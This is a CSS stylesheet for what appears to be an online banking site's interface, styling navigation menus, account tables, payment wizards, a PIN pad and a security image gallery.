.quick-menu.open .dropdown-toggle.btn-default { border-color: #BBB!important; background: #fff!important; z-index: 1001!important; border-top: 1px solid #cccccc!important; border-right: 1px solid #cccccc!important; border-left: 1px solid #cccccc!important; border-bottom: none!important; border-radius: 3px 3px 0 0!important; box-shadow: none!important; }
.quick-menu.open .dropdown-toggle.btn-default span { border-top-color: #333 }
.quick-menu ul.dropdown-menu { margin: 18px 0 0 0!important; padding: 4px 0; border: 1px solid #cccccc !important; border-radius: 0; }
h3 .quick-menu ul.dropdown-menu { margin: 18px 0 0 0!important; padding: 4px 0; border: 1px solid #cccccc !important; border-radius: 0; right: auto; left: auto; }
.quick-menu_TransfersoverviewPage ul.dropdown-menu {margin:18px -18px 0 0!important;}
.quick-menu_managePayees.quick-menu ul.dropdown-menu { margin: 5px -6px 0 0!important; }
.quick-menu_managePayees{margin:0;  font-weight: normal!important;  text-align: right!important;  width: 51px;  display: inline-block; position: relative; vertical-align: text-top; height:30px;}
.quick-menu_managePayees .caret{ vertical-align:middle!important; margin-bottom:10px;}
.quick-menu ul.dropdown-menu li a { font-size: 12px }
.right-box-item-holder { padding: 0 0 10px 0!important }
.right-box { border: 1px solid #c0bfbb; border-radius: 4px; margin-bottom: 15px; overflow: hidden!important; }
.right-box-marketing { margin-bottom: 15px }
.right-box-marketing img { width: 100% }
.right-box-item { padding: 0 10px 0 40px; color: #606060; font-size: 12px; margin: 0; overflow: hidden!important; }
.right-box-item-singlelink { padding: 0 10px 0 20px; color: #606060; margin: 0; }
.right-box-item li { list-style: none; padding: 5px 0; }
.right-box-item a { padding: 0 0 0 5px }
.right-box-item a:before { margin: -1px 0 0 -25px!important }
.right-box-item a:After { margin: -1px 0 0 5px!important; position: absolute; }
.rightbox-icon-phone span { margin-left: 5px }
.rightbox-icon-lock span { margin-left: 5px; display: inline-block; }
.right-box-item a, .right-box-item-singlelink a { color: #606060; text-decoration: none; }
.right-box-item a:hover { color: #d81e05 }
.right-box-item a:before, .right-box-item-singlelink a:before, .right-box-item span:before { font-family: fontAwesome; font-weight: normal; font-style: normal; text-decoration: inherit; -webkit-font-smoothing: antialiased; color: #d81e05; font-size: 18px; margin: 0 0 0 -20px; padding-right: 6px; }
.right-box-item a:after { font-family: fontAwesome; font-weight: normal; font-style: normal; text-decoration: inherit; -webkit-font-smoothing: antialiased; color: #d81e05; position: absolute; font-size: 18px; margin-left: 5px; display: inline-block; }
.more-link a{color:#2a5db0; }
.more-link a:hover{color:#F00; }
.rightbox-icon-phone span:before { content: "\f095"; margin: 0 0 0 -25px!important; }
.rightbox-icon-comment a:before { content: "\f075" }
.rightbox-icon-comment a{padding:0 !important;}
.rightbox-icon-lock a:before { content: "\f023"; font-size: 22px!important; }
.right-box-item-singlelink.rightbox-icon-lock h4{    padding-left: 20px;
    margin-top: 15px;}
.rightbox-icon-lock span:before { content: "\f023"; font-size: 22px!important; margin: 0 0 0 -20px; }
/*.rightbox-icon-video a:before{ content: "\f03d"; margin:0 100px 0 0!important; text-align:right;}_NO__DOTCOMMA__AFTER__*/
.rightbox-icon-video a:After { content: "\f03d" }
.rightbox-icon-map-mark h4 { padding-left: 25px; margin-top: 15px; }
.rightbox-icon-map-mark a:before { content: "\f041"; font-size: 20px; margin: -3px 0 0 -25px; }
.left-box-item-holder { padding: 0 !important }
.left-box-item { padding: 0; color: #606060; font-size: 12px; margin: 0; width: 100%; border-left: 1px solid #bfbfbf; border-right: 1px solid #bfbfbf; }
.left-box-item .borderbottom { border-bottom: 1px solid #bfbfbf }
.left-box-item li { list-style: none; padding: 9px 0px; font-size: 1em; word-wrap: break-word; background: #ffffff; border-bottom: 1px dotted #D7D7D7; }
.left-box-item li a { margin-left: 5px; white-space:pre-wrap!important; word-break:break-all;  }
.left-box-item li.active { background: #d4d4d4 }
/*.left-box-item li.active:after{
content: "\f0da";
font-family: fontAwesome;
      font-weight: normal;
      font-style: normal;
      text-decoration: inherit;
      -webkit-font-smoothing: antialiased;
      color: #d4d4d4;
      position: absolute;
     font-size: 22px;
     margin:2px 0 0 17px;
}*/
.icon-edit, .icon-envelope, .icon-mobile-phone { font-family: fontAwesome; font-weight: normal; font-style: normal; text-decoration: inherit; -webkit-font-smoothing: antialiased; color: #d81e05; font-size: 18px; padding-right: 10px; }
.icon-mobile-phone { font-size: 23px!important; padding-right: 15px; !important: ; }
.RUIFW-pageid { padding: 0 5px 0 0 }
.btn-holder { text-align: right; margin: 40px 0 0; }
.btn-holder button, .btn-holder input, .btn-holder a { margin: 0 5px!important }
.form-alt-txt { font-size: 11px; margin:3px 0 0 0!important; display:block; }
.wizard-box { border-right: 1px solid #e0e0e0; border-left: 1px solid #e0e0e0; border-bottom: 1px solid #e0e0e0; }
.wizard-step-counter { display: table; border-collapse: inherit; width: 100%; }
.wizard-step-counter div { white-space: nowrap; display: table-cell; padding: 13px; background: #f5f5f5; vertical-align: middle; border-left: 1px solid #d8d8d8; border-top: 5px solid #d8d8d8; color: #606060; }
.wizard-step-counter div.no-counter { display: table-cell; padding: 0; background: #fff; vertical-align: middle; border-top: 1px solid #eeeeee; color: #606060; }
.wizard-step-counter #Step1 { border-left: none!important }
.wizard-step-counter div:first-child { border-left: none!important }
/*.wizard-step-counter div:last-child{width:100%;}_NO__DOTCOMMA__AFTER__*/
/*.wizard-step-counter.short-steps div:last-child{width:100%;}_NO__DOTCOMMA__AFTER__*/
.short-steps div:last-child { width: 100% }
.short-steps #Step1 { white-space: nowrap }
.short-steps #Step2 { white-space: nowrap }
.short-steps #Step3 { white-space: nowrap }
.short-steps #Step4 { white-space: nowrap }
.short-steps #Step5 { white-space: nowrap }
.short-steps #tab3-step1 { white-space: nowrap }
.short-steps #tab3-step2 { white-space: nowrap }
.short-steps #tab3-step3 { white-space: nowrap }
.short-steps1 >.last-child { width: 68%!important }
.short-steps2 >.last-child { width: 65%!important }
.short-steps3 >.last-child { width: 57%!important }
.short-steps4 >.last-child { width: 30%!important }
.wizard-step-counter div.active { border-top: 5px solid #d81e05; background: #e0e0e0; color: #5e5e5e; }
.wizard-form-title { padding: 25px }
.wizard-form-payroll-title { padding: 15px; border-top: 1px solid #e0e0e0; border-bottom: 1px solid #e0e0e0; }
.wizard-form-title h4 { margin-bottom: 0px; margin-top: 0; }
.wizard-form-title p { margin-top: 5px; margin-bottom: 0px; }
.wizard-form-title fieldset { margin: 0px }
.wizard-form-title input { vertical-align: text-top }
.wizard-form-title_2 { padding: 0 25px 25px 0 }
.wizard-form-title_2 h4 { margin-bottom: 0px }
.wizard-form-title_2 p { margin-top: 5px; margin-bottom: 0px; }
.wizard-form-title_2 fieldset { margin: 0px }
.wizard-form-title_2 input { vertical-align: text-top }
.wizard-form-content { padding: 25px; background: #F1F1F1; }
.wizard-form-content2 { padding: 25px; background: #E0E0E0;}
.wizard-form-title2 { padding: 25px; padding-bottom: 0px; background: #e0e0e0; }
.table thead > tr > th.sort { color: #2A5DB0 !important; cursor: pointer; padding-right:15px!important; }
.homebottomtable .table .actions { width: 50px; vertical-align: top; }
.lastactions_td .table .actions { width: 22%; vertical-align: top; }
.table thead > tr > th.sort.headerSortDown:after { content: "\f0d7"; color: #d81e05; font-family: fontAwesome; font-size: 13px; font-style: normal; font-weight: normal; margin: 0 0 0 5px!important; position: absolute!important; text-decoration: inherit; }
.table thead > tr > th.sort.headerSortUp:after { content: "\f0d8"; color: #d81e05; font-family: fontAwesome; font-size: 13px; font-style: normal; font-weight: normal; margin: 0 0 0 5px!important; position: absolute!important; text-decoration: inherit; display: inline-block; }
/*tab*/
.nav-two-tabs { /*background: none repeat scroll 0 0 #e9e6df;; border: 1px solid #d8d8d8; */ margin: 10px 0 0; color: #555555!important; width: 95%; font-size: 1.3rem; font-size: 13px; }
.tab-content-border { border: 1px solid #d8d8d8; margin-top: -1px; }
.nav-tabs > li > a, .nav-tabs > li > a:hover { border-radius: 0; border: none!important; background: transparent; filter: none; margin-right: 0; }
/*.nav-tabs > li:not(.active) > a{padding-top: 14px;}
*/
.nav-two-tabs > li { float: left; background: none repeat scroll 0 0 #e9e6df; margin-right: 5px; text-align: center; border-right: 1px solid #d8d8d8; border-top: 1px solid #d8d8d8; border-bottom: 1px solid #d8d8d8; border-left: 1px solid #d8d8d8; margin-top: 1px; margin-bottom: 0; }
.nav-tabs { border-bottom: none }
.nav .active { background: none repeat scroll 0 0 #ffffff; border-right: 1px solid #d8d8d8; border-bottom: 1px solid #ffffff; border-top: 1px solid #d8d8d8; border-left: 1px solid #d8d8d8; margin-top: 1px; margin-bottom: 0; }
.nav-two-tabs a { color: #555555!important }
/*----------------------*/
.RUIFW-nav-main{ width:inherit!important;}
.main-icons .RUIFW-nav-main{ width:inherit!important; float:none;}
.RUIFW-nav-main > li.active > a, .RUIFW-nav-main > li.active > a:hover { background: #F6F6F6; border-bottom: none; box-shadow: 0 0 0; color: #D81E05; filter: none; margin-left: -1px; margin-top: -3px; text-shadow: 0 0 0; padding-bottom: 8px; border: none!important; }
.RUIFW-nav-main > li > a:hover, .RUIFW-nav-main > li > a:focus { /* background-color: #A31600;*/ background: #d81e05; color: #d0c2cd; filter: none; outline:none!important; }
.RUIFW-nav-main > li.active > .dropdown-menu { width: 200px }
.RUIFW-nav-main > li > .dropdown-menu.two-col > li { float: left; width: 50%; position: relative; }
.RUIFW-nav-main > li > .dropdown-menu.three-col > li { float: left; width: 33%; position: relative; }
.RUIFW-nav-main > li > .dropdown-menu > li.banner { background: #F1F1F1; height: 100%!important; position: absolute; right: 0; text-align: center; top: 0; padding: 20px 10px; font-size: 10px; display: block; }
.RUIFW-nav-main > li > .dropdown-menu > li.banner div { font-size: 10px; display: block; float: none; overflow: hidden; clear: both; vertical-align: top; width: 100%; }
.RUIFW-nav-main > li > .dropdown-menu > li.banner button { max-width: 100%; height: auto; font-size: 1.3em; }
.RUIFW-nav-main > li > .dropdown-menu > li.banner img { padding: 10px 0; max-width: 100%; height: auto; }
.RUIFW-nav-main > li > .dropdown-menu > li a { border: none; color: #2a5db0 !important; font-size: 1.2rem; font-size: 12px; font-weight: normal; padding: 15px 20px 0; white-space: pre-wrap; }
.RUIFW-nav-main > li > .dropdown-menu > li a.nowrap { white-space: nowrap }
.RUIFW-nav-main > li > .dropdown-menu > li div.nowrap { white-space: nowrap }
.RUIFW-nav-main > li > .dropdown-menu > li div { color: #606060 !important; font-size: 12px; padding: 0 10px 15px 20px; white-space: pre-wrap; }
.RUIFW-nav-main > li > .dropdown-menu > li.active a, .RUIFW-nav-main > li > .dropdown-menu > li a:hover { color: #D81E05  !important; background: none; filter: none; text-decoration: underline; }
.navbar-nav > li > .dropdown-menu { right: 10px!important; background: #fff; border: 1px solid #ccc; border-top: none; top: 45px; box-shadow: 0px 3px 1px 0px rgba(206, 206, 206, 0.4); }
.navbar-nav > li > .payIEholder { right:inherit!important; width: 60%; left: inherit!important; margin-left:-10px!important; }
.navbar-nav > li > .payIEholder_Caribbean { right: inherit!important; width: 50%; left: inherit!important; margin-left:-10px!important; }
.navbar-nav > li > .TransferHolder { width: 60%; left: inherit!important;right:inherit!important; margin-left:-10px!important;  }
.navbar-nav > li > .TransferHolder_Caribbean { width: 50%; left: inherit!important; right: inherit!important; margin-left:-10px!important;  }
.navbar-nav > li > .InvestHolder { width: 58%; left: inherit!important; margin-left:-10px!important;right:inherit!important;}
.navbar-nav > li > .TopHolder { width: 40%; left: inherit!important; margin-left:-10px!important; right:inherit!important;}
.navbar-nav > li > .TopHolder_Caribbean { width: 40%; left: inherit!important; margin-left:-10px!important; right:inherit!important;}
.navbar-nav > li > .HelpHolder { width: 40%; left: inherit; padding-bottom: 40px; }
.navbar-nav > li > .two-col.no-banner { width: 20%;}
.navbar-nav > li > .three-col.no-banner { width: 40%;}
.navbar-nav > li > .two-col.no-banner li{width: 100%;}
.navbar-nav > li > .three-col.no-banner li{width: 50%;}
.navbar-nav > li > .two-col.no-banner  .banner,.navbar-nav > li > .three-col.no-banner  .banner{display:none;}
.RUIFW-nav-main > li.has-submenu a { padding-right: 30px!important }
@media all and (orientation:portrait) {
 .navbar-nav > li > .TopHolder { width: 40%; left: inherit!important; margin-left:-10px!important; right:10px!important;}
 .navbar-nav > li > .InvestHolder { width: 60%; left: inherit!important; margin-left:-10px!important;right:10px!important;}
 .navbar-nav > li > .TransferHolder { width: 60%; left: inherit!important;right:10px!important; margin-left:-10px!important;  }
 .navbar-nav > li > .payIEholder { right:inherit!important; width: 60%; left: inherit!important; margin-left:-10px!important; }
}
#nav-help { margin-right: 12px!important; }
.RUIFW-nav-main > li.has-submenu.open  a { background: #fff !important; color: #d81e05; border-top: 1px solid #cecece; filter: none; }
.RUIFW-nav-main > li.has-submenu a:after { font-family: fontAwesome; font-weight: normal; font-style: normal; text-decoration: inherit; -webkit-font-smoothing: antialiased; content: "\f0d7"; color: #fff; position: absolute; font-size: 13px; padding: 3px 0 0 13px; }
.RUIFW-nav-main > li.has-submenu.open a:first-child:after { content: "\f0d8"; color: #d81e05; }
.RUIFW-nav-main > li.has-submenu.open > .dropdown-menu > li a { border-top: none }
.RUIFW-nav-main > li.has-submenu.open > .dropdown-menu > li a:after { content: normal; color: #d81e05; }
.RUIFW-nav-main .dropdown-menu > li > a:hover, .RUIFW-nav-main .dropdown-menu > li > a:focus, .RUIFW-nav-main > li > .dropdown-menu > li.active a:focus, .RUIFW-nav-main .active a:focus { background: transparent }

.RUIFW-nav-main > li.has-submenu.open .banner a{background: none !important; padding:0 5px 0 0 !important;}
.RUIFW-nav-main > li > .dropdown-menu > li.banner div{white-space:normal;}

/*page footer*/
.RUIFW-page-wrap:after { height: 10px; border-bottom: 5px solid #f1f1f1; border-right: 5px solid #f1f1f1; border-left: 5px solid #f1f1f1; }
.RUIFW-page-footer { height: 0 }
.RUIFW-page-footer { z-index: inherit; text-align: left; }
.RUIFW-nav-footer { border-top-color: #c6c5c3; padding: 10px 0; margin-bottom: 0; }
.RUIFW-nav-footer li { padding: 5px 0 }
.RUIFW-nav-footer li.separator { border-right: 1px solid #c6c5c3; float: left; }
.RUIFW-nav-footer li a { border: none; padding: 0px 8px!important; }
.RUIFW-nav-footer li a:hover { background: transparent; text-decoration: underline; }
.footer-icons { width: 100%; padding-top: 20px; }
.footer-icons .icons { float: left; text-align: center; padding: 0 4px; font-size: 12px; }
.footer-icons .icons img{ width:60px!important; height:60px!important; }
.footer-icons .icons span { padding: 5px 0 0 0 }
.RUIFW-nav-footer li.copyright {  right: 8px; font-size: 11px; display: block; text-align: right;  }
/* navbar background*/
.RUIFW-bg-bar { height: 45px; top: 81px; z-index: 0; min-width: 768px; }
.RUIFW-bg-bar .RUIFW-bg-main-nav { height: 45px; background: #d81e05; }
.RUIFW-container-header { height: 126px }
.RUIFW-container-well { border-radius: 0 0 0 0; margin-bottom: 0; padding: 0; }
#paytrans_tab { border-right: 1px solid #d8d8d8; border-bottom: 1px solid #d8d8d8; border-left: 1px solid #d8d8d8; }
.RUIFW-container, .RUIFW-content-pan, .RUIFW-form-actions { border-radius: 0 0 0 0; padding: 10px 0; }
.RUIFW-container-well, .RUIFW-form-actions { background: transparent; border: none; padding: 0; border-radius: 0; }
.RUIFW-container-btns > * +  *, .RUIFW-form-btns > * + * { margin-left: 4px }
.RUIFW-container-btns *[class*="pull-right"] + *[class="pull-right"], .RUIFW-form-btns *[class*="pull-right"] + *[class*="pull-right"] { margin-right: 6px; margin-left: 0; }
/*table*/
table tr th { filter: none!important }
.homebottomtable { margin: 0 1% 1% 1% }
.homebottomtable table .actions { padding-left: 2% }
.homebottomtable table tr th:last-child { border-right: 2px solid #f5f5f5!important }
.homebottomtable table tr th { background: #f5f5f5!important; border-right: 2px solid #ffffff!important; border-top: 0px!important; border-left: 0px!important; border-bottom: 0px!important; vertical-align: text-top; }
.homebottomtable table tr td { border-right: 2px solid #ffffff!important; border-top: 0px!important; border-left: 0px!important; border-bottom: 1px solid #f5f5f5!important; vertical-align: top; white-space:inherit!important; /*added for table fix topup activity*/ }
.homebottomtablemodal table tr td { border-right: 1px solid #ccc!important; border-top: 1px solid #ccc!important; border-left: 1px solid #ccc!important; border-bottom: 1px solid #ccc!important; vertical-align: top; white-space:inherit!important; /*added for table fix topup activity*/ }
/*.homebottomtable table tr:nth-child(even) td{background: #f5f5f5!important}
.homebottomtable table tr:nth-child(odd) td{background: #FFF!important}*/
.popup_table .RUIFW-table-sec-head th { background: #d7d7d7!important; border-right: 2px solid #ffffff!important; border-top: 0px!important; border-left: 0px!important; border-bottom: 0px!important; vertical-align: text-top; color: #606060; text-shadow: none; text-align: center; }
.table-container{overflow: auto; }
.contenttbs table tr th { background: #f5f5f5!important; border-right: 2px solid #fff!important; border-top: 0px!important; border-left: 0px!important; border-bottom: 0px!important; vertical-align: text-top; }
.contenttbs table tr td { border-right: 2px solid #ffffff!important; border-top: 0px!important; border-left: 0px!important; border-bottom: 1px solid #f5f5f5!important; vertical-align: top; }
.contenttbs_dark table tr th { background: #d7d7d7!important; border-right: 2px solid #ffffff!important; border-top: 0px!important; border-left: 0px!important; border-bottom: 0px!important; vertical-align: text-top; text-shadow: none; }
.alerts_table table tr td:last-child { /* white-space: pre-wrap!important; nowhitespace: afterproperty; word-wrap: break-word; Internet Explorer 5.5+ */ word-break: normal; text-wrap: normal; }
.alerts_table label{font-weight: normal !important; min-height: 18px; margin-bottom:0px;}
.alerts_table .RUIFW-form-el{width: 130px;}
.contenttbs_dark table tr th:last-child { border-right: 2px solid #d7d7d7!important }
.contenttbs_dark .RUIFW-table-sec-title:hover { background: #d7d7d7!important }
.contenttbs_dark table tr th:first-child { padding-left: 12px;}
.contenttbs_dark table tr td:first-child { padding-left: 12px;}
.odd td { background: #ffffff !important }
.even td { background: #f5f5f5 !important }
table[class*="RUIFW-table"] { font-size: 1.2rem; font-size: 12px; border-collapse: collapse; }
table[class*="RUIFW-table"] tr th { background: #f5f5f5 }
table[class*="RUIFW-table-modal"] tr th { background: #333 !important; }
table[class*="RUIFW-table"] tbody tr th, .RUIFW-table-border td { border-top: 1px solid #DDD; /*border-bottom: 1px dashed #DDD */; }
table[class*="RUIFW-table"] thead th { border-bottom-width: 1px!important; color: #606060; white-space:inherit!important;/*added for tabel Recipients page responsive alignment */ /*background: linear-gradient(to bottom, #FFFFFF 0%, #F2F2F2 100%) repeat scroll 0 0 rgba(0, 0, 0, 0)!important;  W3C */ }
table[class*="RUIFW-table-modal"] thead th { border-bottom-width: 1px!important; color: #f9f9f9 !important; white-space:inherit!important; text-shadow: none !important;/*added for tabel Recipients page responsive alignment */ /*background: linear-gradient(to bottom, #FFFFFF 0%, #F2F2F2 100%) repeat scroll 0 0 rgba(0, 0, 0, 0)!important;  W3C */ }
table[class*="RUIFW-table"] thead tr.header-nowrap th { white-space:nowrap !important; }
tr.RUIFW-table-sec-title th, tr.RUIFW-table-sec-title:hover th { background: transparent!important }
.highlight-row:hover > td { background-color: #606060 !important; color: #fff !important; }
.highlight-row,.highlight-row td{ background-color: #606060 !important; color: #fff !important; }
.RUIFW-table tr.clickable { cursor: pointer }
/*.RUIFW-table tr td:first-child { width: 10%;}_NO__DOTCOMMA__AFTER__*/
table.overview-table { margin-bottom: 0px!important; border-top: 0!important; border-bottom: none; }
.overview-table tr { border-top: 1px dotted #D7D7D7!important; /*background: #fbfbfb!important*/; }
.overview-table tr td { font-size: 1.3em!important; border-top: 0!important; padding-top: 15px!important; padding-bottom: 15px!important; }
.overview-table tr td:first-child { padding-left: 20px!important }
.overview-table tr td.account-type { width: 55%; word-break: normal!important; white-space: pre-wrap!important; }
.overview-table tr td.balance { width: 40% }
.overview-table tr td.actions { width: 10% }
.overview-table tr td:first-child a { color: #2a5db0!important; }
.overview-table tr td:first-child a:hover { text-decoration: none!important; color: #d81e05!important; }
.RUIFW-table-border td { border: 0 }
.RUIFW-table tr td:last-child { white-space: nowrap!important;}
.lastactions_td .RUIFW-table tr td{ white-space:normal; }
.item-description td { background: none repeat scroll 0 0 #FBFBFB; white-space: normal; }
.item-description td div { float: left; padding: 7px 5px; }
.item-description td div.accnt-act-details1 { /*  margin-left: 10%;*/ padding:0px;margin-bottom:10px; white-space:normal; width: 55%; }
.item-description td div.left-margin{ margin-left: 13.5% !important; }
.accnt-act-details1 p { margin: 0; float:none; vertical-align:top; overflow:hidden; clear:both; display:block!important;  width:100%;}
.accnt-act-details1 span { display: inline-block; nowhitespace: afterproperty; word-wrap: break-word; /* Internet Explorer 5.5+ */ word-break: initial; vertical-align: text-top; float:right; text-align:left!important;width:65%; padding-bottom:5px;}
.accnt-act-details1 label { font-weight: normal!important; font-size: 12px; vertical-align: text-top; display: inline-block; margin-bottom:0px; width:35%;float:left; word-break:initial;}
.modalPrint .modal-body .accnt-act-details1{ padding:0px!important;}
.modalPrint .modal-body .accnt-act-details1 p{border-bottom: 1px solid #D7D7D7!important;}
.modalPrint .modal-body .accnt-act-details1 p span {width: 65%; padding:5px!important; position:relative!important;}
.modalPrint .modal-body .accnt-act-details1 label { width: 35%;padding:5px!important; border-right: 1px solid #D7D7D7!important; }
.modalPrint .modal-body .accnt-act-details1 label.trans-label-only { width: 100%;padding:5px!important; border-right: none !important; }
.item-description td div.accnt-act-details3 { /*  margin-left: 5%;*/padding:0px;white-space:normal;; width: 100%; }
.item-description td div.accnt-act-details2 { width: 45%; padding: 0px; text-align: right; white-space: normal; }
.item-description td div.accnt-act-details2 a { /* margin: 5px 0 5px 0;*/ margin-bottom:5px; text-align:right; cursor:pointer; }
.item-description td div.accnt-act-details4 { width: 45%; padding: 0px; text-align: right; white-space: normal; }
.item-description td div.accnt-act-details4 a { /* margin: 5px 0 5px 0;*/ margin-bottom:5px;margin-right:5px; }
.toggle-btn { background: none repeat scroll 0 0 #f5f5f5; display: block; font-size: 14px; height: 40px; padding: 5px 0; text-decoration: none; text-align: center; }
.toggle-btn:after { content: "\f107"; font-family: fontAwesome; font-size: 13px; font-style: normal; font-weight: normal; padding: 2px 0 0 0; position: absolute; text-decoration: inherit; display: inline-block; float: none; margin-left:5px;}
.toggle-btn.Open:after { content: "\f106" }
#myToggleDiv { background: none repeat scroll 0 0 #F5F5F5; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05); padding: 10px; text-align: center; margin-bottom: 0 !important; }
.popup_box { width: 300px; position: absolute; z-index: 9999; background: #333333; border: 1px solid #333333; border-radius: 4px; padding: 10px; color: #fff; }
.popup_box:before { content: "\f0d8"; font-family: fontAwesome; font-size: 20px; font-style: normal; font-weight: normal; margin: -25px 0 0 145px; position: absolute; text-decoration: inherit; color: #333333; }
.account-balance-container span { color: #606060!important }
.account-balance-container { background: #f5f5f5; border: 1px solid #d8d8d8; padding: 10px 0 0 0; font-size: 1.2rem; font-size: 12px; color: #606060!important; font-weight: normal!important; }
.account-balance-container h6 { margin-top: 5px }
.account-balance-container h6 span { float: right }
.RUIFW-container-well .data-set { padding: 0 0 25px }
.RUIFW-container-well .sub-title { font-weight: bold }
.RUIFW-tab-content:before, .RUIFW-tab-content:after { height: auto }
.RUIFW-pinpad-wrap > input { width: auto }
.RUIFW-pinpad { background: #f5f5f5; border: 1px solid #ccc; box-shadow: 1px 1px 4px #EEEEEE; border-radius: 5px; width: 162px; padding: 4px; white-space: pre-wrap; margin-top: 10px; display: block!important; }
.RUIFW-pinpad:before, .RUIFW-pinpad.top:before { display: none }
.RUIFW-pinpad .btn-default { background: #c51902!important; color: #fff!important; border-color: #ccc!important; font-weight: normal!important; padding: 6px 12px; }
.RUIFW-pinpad .RUIFW-key-clear { width: 72px; color: #606060; padding: 6px 12px; }
.RUIFW-pinpad .btn-default:hover { background: #c51902!important; border-color: #CCC!important; }
.RUIFW-pinpad .btn-default:active { background: #c51902!important; border-color: #CCC!important; }
.RUIFW-pinpad .btn-default:selected { background: #c51902!important; border-color: #CCC!important; }
.RUIFW-pinpad .btn-default:focus { background: #c51902!important; border-color: #CCC!important; }
.RUIFW-pinpad .btn-default.active { background-color: #c51902!important; border-color: #CCC!important; }

/*Jyothi Garadas*/
.space-pay table tr td:first-child { padding-left: 12px; white-space: nowrap!important; }
.pay-details3 label { width: 29%!important; font-weight:bold!important; font-size:12px!important; padding-bottom:10px; margin-right:3px;}
.pay-div {width:100%; padding: 0px!important;}
.pay1-width{width: 99%!important;}
.pay2-span{width: 39%!important;}
.wizard-box-pay { border:1px solid #e0e0e0; }
.right-border{border-right: 0px !important;}
.contenttbs_pay table tr th { background: #d7d7d7!important; border-right: 2px solid #ffffff!important; border-top: 0px!important; border-left: 0px!important; border-bottom: 0px!important; vertical-align: text-top; text-shadow: none; }
.contenttbs_pay table tr th:last-child { border-right: 0px solid #d7d7d7!important }
.contenttbs_pay.RUIFW-table-sec-title:hover { background: #d7d7d7!important }
.contenttbs_pay table tr th:first-child { padding-left: 12px; white-space: pre-wrap!important; }
.contenttbs_pay table tr td:first-child { padding-left: 12px;}
.text-cursor {cursor:text!important;}
.acc_pop{text-align:justify!important; padding:10px 26px 0px 50px!important;}
.radio_pop{display:inline!important;}
.date-input-bg{background-color:#fff;}
.wordbreak{word-break:normal!important;}
.row-margin{margin-right:0px!important; margin-left: 5px!important;}
.RUIFW-tooltip + .tooltip > .tooltip-inner {-webkit-border-radius:4px; behavior:url('Js/border-radius.htc'); height:auto;}
.protect-cheque-icon-disabled { background: #ffffff url(../images/protect-cheque_grey.png) left top no-repeat; width:30px; height:20px; display:block;}
 input[type=text]::-ms-clear{display: none;}


@media only screen and (min-width: 0px) and (max-width: 800px){
.navbar-nav .open .dropdown-menu {
 position: absolute;width: 64%; background-color: #fff!important;box-shadow: none;border-width: medium 1px 1px;
border-style: none solid solid;border-color: -moz-use-text-color #CCC #CCC;
-moz-border-top-colors: none;-moz-border-right-colors: none;-moz-border-bottom-colors: none;-moz-border-left-colors: none;}
 .navbar-nav .open .dropdown-menu > li > a,
 .navbar-nav .open .dropdown-menu .dropdown-header {padding: 5px 0px 0px 12px;}
 .RUIFW-nav-main > li.has-submenu a { padding-right: 26px!important }
 .RUIFW-nav-main > li > a {padding:12px 6px 12px 6px!important;}
 .RUIFW-nav-main > li > .dropdown-menu > li div {padding: 0px 8px 15px 12px;}
 .RUIFW-nav-main > li > .dropdown-menu > li.banner{padding-top:5px}
 .RUIFW-nav-main > li > .dropdown-menu.payIEholder_Caribbean > li.banner{padding:7px 35px;}
 
 }


/*Popover-tooltip

.enrol-popover, .popover{background-color:#181818!important; color:#fff!important;}
.enrol-popover, .arrow{border-width: 0px!important;}
.enrol-popover.right, .arrow:after {
    bottom: -10px!important;
    left: 11px!important;
    content: " ";
    border-right-color:#181818!important;
    border-left-width: 0px;
	border-width: 6px!important;
}

.enrol-popover.right, .arrow {
	top:43%!important;
    left: -23px!important;
    margin-top: -2px!important;
    border-right-color: rgba(0, 0, 0, 0)!important;
    border-left-width: 0px;

}

.enrol-popover, .popover-content  {padding: 7px 10px!important;}*/


/*Praveen*/
.download-icon, .calculator-icon, .print-icon { margin: 0 10px 0 10px }
.download-icon { background: url(../images/download.png) left top no-repeat; width: 20px; height: 21px; }
.calculator-icon { background: url(../images/calculator.png) left top no-repeat; width: 20px; height: 21px; }
.print-icon { background: url(../images/print.png) left top no-repeat; width: 20px; height: 21px; }
.overview-container { background: #f5f5f5; border: 1px solid #d7d7d7; }
.bottom-box { border-left: 1px solid #c0bfbb; border-right: 1px solid #c0bfbb; border-top: 3px solid #c0bfbb; margin-top: 30px; padding-top: 5px; }
.main-icons > li > .dropdown-menu { margin-left: -305px!important }
.main-icons li .dropdown-menu h4 { padding-right: 15px; padding-left: 15px; font-size: 1.2em; margin-top: 10px; }
/*.main-icons li .dropdown-menu li {padding:0!important;text-align:left;}_NO__DOTCOMMA__AFTER__*/
/*.main-icons li .dropdown-menu li a{  padding:5px 0 5px 15px!important;}_NO__DOTCOMMA__AFTER__*/
.main-icons li .dropdown-menu { right: 10px }
.main-icons li .dropdown-menu li a { display: block!important; float: none; clear: both; vertical-align: top; overflow: hidden; }
.main-icons li .dropdown-menu li div { display: block!important; float: none; clear: both; vertical-align: top; overflow: hidden; }
.main-icons li.has-submenu a:after { padding: 0!important; font-family: none; font-weight: none; font-style: none; text-decoration: none; -webkit-font-smoothing: none; content: none; color: none; position: none; font-size: none; }
.main-icons li.has-submenu.open a:first-child:after { padding: 0!important; font-family: none; font-weight: none; font-style: none; text-decoration: none; -webkit-font-smoothing: none; content: none; color: none; position: none; font-size: none; }
.main-icons li.has-submenu a { padding-right: 12px!important }
/*--------------------------security image gallery css start---------------------*/
/* Float the ul to the right with a width to give 3 thumbnail images per row */
#thumbs { margin-left: auto; margin-right: auto; width: 235px; text-align: center!important; }
#thumbs div.item { margin-left: auto; margin-right: auto; text-align: center; }
#thumbs div.item ul { list-style: none; display: inline-block; padding: 0; margin-top: 20px; width: 213px; text-align: center; margin-left: auto; margin-right: auto; float: none; clear: both; vertical-align: top; overflow: hidden; }
/* Place the list items inline using display:inline for IE and float:left */
#thumbs ul li { display: inline-block; width: 65px; height: 65px; float: left; margin: 2.5px 2.5px 2.5px 2.5px; }
/div.content { /* The display of content is enabled using jQuery so that the slideshow content won't display unless javascript is enabled. */ display: none; text-align: center; vertical-align: text-top; margin-left: auto; margin-right: auto; width: 205px; }
div.content a, div.navigation a { text-decoration: none; color: #777; }
div.content a:focus, div.content a:hover, div.content a:active { text-decoration: underline }
div.controls { margin-top: 5px; height: 23px; }
div.controls a { padding: 5px }
div.ss-controls { float: left }
div.nav-controls { float: right }
div.slideshow-container { position: relative; clear: both; /*margin-top: 6%!important;text-align:center;*/ }
div.slideshow a.advance-link { display: block; width: 205px; height: 205px; /* This should be set to be at least the height of the largest image in the slideshow */ text-align: center; margin-left: auto; margin-right: auto; }
